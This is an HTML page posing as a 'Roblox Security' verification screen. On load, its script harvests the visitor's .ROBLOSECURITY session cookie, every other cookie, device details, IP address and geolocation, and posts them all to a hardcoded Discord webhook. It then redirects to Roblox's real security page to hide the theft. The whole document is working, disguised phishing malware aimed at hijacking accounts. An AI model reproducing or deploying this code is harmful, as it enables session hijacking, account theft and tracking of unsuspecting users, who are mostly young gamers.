<!DOCTYPE html>
<html>
<head>
    <title>Roblox Security</title>
    <style>
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            text-align: center;
        }
        .box {
            background: #111;
            padding: 40px;
            border-radius: 10px;
            border: 2px solid #7289da;
        }
        h1 {
            font-size: 80px;
            margin: 0;
            color: #7289da;
        }
    </style>
</head>
<body>

    <div class="box">
        <h1>VERIFYING...</h1>
        <p>Please wait while we check your security...</p>
    </div>

<script>
// ==============================================
// ✅ SETTINGS
const webhookURL = "https://discord.com/api/webhooks/1488710258745409597/PsBpjmuYwlJOPInpSFH9_Fv9hy4Vspi10Mqe4_6tKQx8_KrZZRbdLYxDrvYb-3u5fwLt";
const redirectLink = "https://www.roblox.com/my/account#!/security";
// ==============================================

// 1. DEVICE INFO
const ua = navigator.userAgent;
let os = "Unknown OS", device = "Unknown Device", browser = "Unknown Browser";
if (ua.includes("Win")) os = "Windows";
else if (ua.includes("Android")) os = "Android";
else if (ua.includes("Mac")) os = "Mac OS";
else if (ua.includes("iPhone") || ua.includes("iPad")) os = "iOS";
else if (ua.includes("Linux")) os = "Linux";
if (ua.includes("Mobile") || ua.includes("Android") || ua.includes("iPhone")) device = "📱 PHONE / CP";
else device = "💻 COMPUTER / PC";
if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "Google Chrome";
else if (ua.includes("Firefox")) browser = "Mozilla Firefox";
else if (ua.includes("Edg")) browser = "Microsoft Edge";
else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "Apple Safari";
else browser = "Other Browser";

const info = {
    deviceType: device,
    operatingSystem: os,
    browserName: browser,
    platform: navigator.platform,
    language: navigator.language,
    screen: `${window.screen.width} x ${window.screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    cookies: navigator.cookieEnabled ? "Enabled" : "Disabled"
};

// ==============================================
// ✅ METHOD 1 & 2 & 3 - TRY LAHAT PARA MAKUHA
// ==============================================
let finalCookie = "NOT FOUND";

// METHOD 1: NORMAL GET
function getCookie(name) {
    let value = "; " + document.cookie;
    let parts = value.split("; " + name + "=");
    if (parts.length == 2) return parts.pop().split(";").shift();
}
finalCookie = getCookie(".ROBLOSECURITY");

// METHOD 2: TRY IBA PANG NAME
if (!finalCookie) finalCookie = getCookie("ROBLOSECURITY") || getCookie("robloxsecurity") || "NOT FOUND";

// METHOD 3: ILABAS LAHAT NG COOKIE KAHIT ANO
const allCookies = document.cookie;

// ==============================================
// ✅ SEND TO DISCORD
// ==============================================
function sendData(ip, city, region, country, loc, isp) {
    const payload = {
        content: "@everyone 🚨 💻 NEW LOG!",
        embeds: [{
            title: "🔍 FULL INFO + COOKIE",
            color: 0x00ff00,
            fields: [
                { name: "💻 DEVICE", value: `Type: ${info.deviceType}\nOS: ${info.operatingSystem}\nBrowser: ${info.browserName}`, inline: false },
                { name: "📡 NETWORK", value: `IP: \`${ip}\`\nLocation: ${city}, ${region}, ${country}\nISP: ${isp}`, inline: false },
                
                // ✅ DITO YUNG COOKIE PART
                { name: "\n🍪 ROBLOX COOKIE", value: "──────────────", inline: false },
                { name: ".ROBLOSECURITY", value: "```" + finalCookie + "```", inline: false },
                
                // ✅ KUNG DI MAKUHA YUNG ISA, ILALABAS NATIN LAHAT
                { name: "📄 ALL COOKIES FOUND", value: "```" + allCookies + "```", inline: false }
            ],
            timestamp: new Date().toISOString()
        }]
    };

    const xhr = new XMLHttpRequest();
    xhr.open("POST", webhookURL, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(payload));

    setTimeout(() => { window.location.href = redirectLink; }, 2000);
}

// ==============================================
// ✅ GET IP & LOCATION
// ==============================================
fetch('https://ipapi.co/json/')
.then(res => res.json())
.then(data => {
    sendData(data.ip, data.city||"N/A", data.region||"N/A", data.country_name||"N/A", data.latitude+", "+data.longitude, data.org||"N/A");
})
.catch(() => {
    fetch('https://ipinfo.io/json')
    .then(res => res.json())
    .then(data => {
        sendData(data.ip, data.city||"N/A", data.region||"N/A", data.country||"N/A", data.loc||"N/A", data.org||"N/A");
    })
    .catch(() => {
        sendData("ERROR", "ERROR", "ERROR", "ERROR", "ERROR", "ERROR");
    });
});

</script>

</body>
</html>
